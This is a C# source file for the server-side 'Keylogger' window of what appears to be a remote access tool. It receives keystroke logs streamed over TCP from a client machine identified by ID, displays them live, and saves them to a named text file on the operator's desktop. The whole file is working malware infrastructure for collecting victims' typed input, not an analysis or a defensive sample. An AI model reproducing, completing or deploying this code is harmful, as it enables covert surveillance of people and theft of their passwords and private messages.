using System;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace Server
{
    public partial class Keylogger : Form
    {
        NetworkStream KeylogStream;
        private Thread KeyLogger;
        private TcpClient clientLog;
        public Keylogger(TcpClient client, string ID)
        {
            InitializeComponent();
            clientLog = client;
            this.Name += '_' + ID;
            this.Text += '_' + ID;
            CheckForIllegalCrossThreadCalls = false;
            KeyLogger = new Thread(logFunction);
            KeyLogger.IsBackground = true;
            KeyLogger.Start();
        }
        public void logFunction()
        {
            KeylogStream = clientLog.GetStream();
            KeylogStream.Flush();
            while (true)
            {
                try
                {
                    byte[] data = new byte[1024];
                    int numBytesRead = KeylogStream.Read(data, 0, data.Length);
                    if (numBytesRead > 0)
                    {
                        string GetLog = Encoding.UTF8.GetString(data, 0, numBytesRead);
                        richTextBox1.Text += GetLog;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    this.Close();
                }
            }
        }
        private void btn_XuatFile_Click(object sender, EventArgs e)
        {
            try
            {
                string content = richTextBox1.Text;
                string clientname = this.Name.Replace(':', '_');
                string filePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\[Key_Log_" + clientname + "]" + ".txt";
                FileStream fs = new FileStream(filePath, FileMode.Create);
                StreamWriter sr = new StreamWriter(fs, Encoding.UTF8);
                sr.Write(content);
                MessageBox.Show("Saved at " + filePath);
                sr.Close();
                fs.Close();
            }
            catch (Exception exc)
            {
                MessageBox.Show(exc.Message);
                this.Close();
            }

        }
    }
}